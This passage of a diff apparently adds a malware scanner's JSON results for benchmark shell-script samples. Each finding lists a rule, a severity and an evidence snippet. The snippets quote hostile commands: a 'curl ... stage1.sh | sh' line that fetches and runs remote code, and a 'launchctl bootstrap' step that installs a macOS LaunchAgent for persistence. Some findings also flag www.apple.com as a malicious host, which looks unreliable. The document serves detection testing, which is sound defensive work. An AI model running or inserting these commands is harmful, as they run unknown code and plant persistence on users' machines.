+          "lineStart" : 11
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl load",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|22|22|5190403414039674362",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh",
+          "lineEnd" : 22,
+          "lineStart" : 22
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|config.rule.file.intel.url.known_malicious_host|0|0|8711931375906926522",
+        "ruleID" : "config.rule.file.intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl load",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|5190403414039674362",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "persistence",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "Script persistence behavior detected.",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Static analyzer surfaced persistence-related indicator.",
+        "id" : "persistence|1162462376102097481",
+        "ruleID" : "static.persistence.indicator",
+        "scoreDeltaBase" : 6,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh"
+        },
+        "tags" : [
+          "persistence"
+        ],
+        "title" : "Persistence indicator"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "shell.launchctl.persistence",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6795042211206357458",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.url.known_malicious_host",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4971587623526871332",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_launchagent_mirror_02.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "A3DEAF21-9A21-41FF-936E-0D5B8E3EFAA3",
+    "sampleID" : "suspicious_shell_launchagent_mirror_02"
+  },
+  {
+    "detectedType" : "shellScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "bash -c \"curl",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|4|4|4409764631102749617",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl bootstrap",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|6|6|4912805701962199599",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+          "lineEnd" : 6,
+          "lineStart" : 6
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl bootstrap gui\/501",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|6|6|-6131200004995577735",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+          "lineEnd" : 6,
+          "lineStart" : 6
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage1.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|4|4|-76144579508149282",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage1.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|4|4|7369643859398382486",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "bash -c \"curl",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|4409764631102749617",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl bootstrap",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|4912805701962199599",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl bootstrap gui\/501",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-6131200004995577735",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage1.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-76144579508149282",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/stage1.sh | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|7369643859398382486",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_multistage_chain_note_02.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "1E5159C5-2166-4ACC-A785-3468E1ED59E3",
+    "sampleID" : "suspicious_shell_multistage_chain_note_02"
+  },
+  {
+    "detectedType" : "shellScript",
+    "findings" : [
+      {
+        "category" : "persistence",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "PERSIST_CMD='launchctl bootstrap gui\/$(id -u) ~\/Library\/LaunchAgents\/com.fake.agent.plist'",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "persistenceLike",
+        "explanation" : "脚本尝试写入 LaunchAgents 或 LaunchDaemons 目录，属于持久化高风险行为。",
+        "id" : "script|shell.write_launchagent|8|8|-3125922052535535973",
+        "ruleID" : "shell.write_launchagent",
+        "scoreDeltaBase" : 32,
+        "severity" : "critical",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "写入 LaunchAgents\/LaunchDaemons"
+      },
+      {
+        "category" : "persistence",
+        "confidence" : "high",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "PERSIST_CMD='launchctl bootstrap gui\/$(id -u) ~\/Library\/LaunchAgents\/com.fake.agent.plist'",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "persistenceLike",
+        "explanation" : "脚本调用 launchctl load\/bootstrap，可能用于注册常驻项。",
+        "id" : "script|shell.launchctl.persistence|8|8|-3125922052535535973",
+        "ruleID" : "shell.launchctl.persistence",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "launchctl 持久化操作"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|intel.url.known_malicious_host|14|14|8711931375906926522",
+        "ruleID" : "intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh",
+          "lineEnd" : 14,
+          "lineStart" : 14
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl bootstrap",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|8|8|4912805701962199599",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|config.rule.file.intel.url.known_malicious_host|0|0|8711931375906926522",
+        "ruleID" : "config.rule.file.intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "launchctl bootstrap",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|4912805701962199599",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "persistence",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "Script persistence behavior detected.",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Static analyzer surfaced persistence-related indicator.",
+        "id" : "persistence|1162462376102097481",
+        "ruleID" : "static.persistence.indicator",
+        "scoreDeltaBase" : 6,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh"
+        },
+        "tags" : [
+          "persistence"
+        ],
+        "title" : "Persistence indicator"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "shell.write_launchagent",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-5553945256804287813",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "shell.launchctl.persistence",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6795042211206357458",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.url.known_malicious_host",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4971587623526871332",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/shell\/suspicious_shell_persistence_sim_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "63792E1A-2F7B-4935-9B21-48D868EAD0F8",
+    "sampleID" : "suspicious_shell_persistence_sim_01"
+  }
+]
